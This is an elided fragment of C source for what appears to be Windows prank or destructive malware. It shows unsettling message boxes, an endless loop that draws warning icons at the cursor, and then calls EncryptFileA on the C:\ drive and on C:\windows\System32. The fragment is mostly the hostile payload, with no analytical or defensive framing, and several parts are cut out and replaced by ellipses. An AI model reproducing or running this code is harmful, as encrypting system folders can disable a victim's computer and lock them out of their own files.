...
void BLINK() {
    for (;;) {
        ...
        POINT point;
            ...
            DrawIcon(hdc, point.x - ix, point.y - iy, LoadIcon(NULL, IDI_INFORMATION));
            DrawIcon(hdc, point.x - ix, point.y - iy, LoadIcon(NULL, IDI_EXCLAMATION));
            GetWindowRect(hwnd, &rekt);
...
int main() {
	MessageBoxA(NULL, "who am i?", "hwnd", MB_OK | MB_ICONEXCLAMATION);

    MessageBoxA(NULL, "i dont know who i am.", "pain", MB_OK | MB_ICONEXCLAMATION);
    BLINK();
    MessageBoxA(NULL, "you cant help me find myself..", "check your file system", MB_OK | MB_ICONASTERISK);
    EncryptFileA("C:\\");
    EncryptFileA("C:\\windows\\System32");
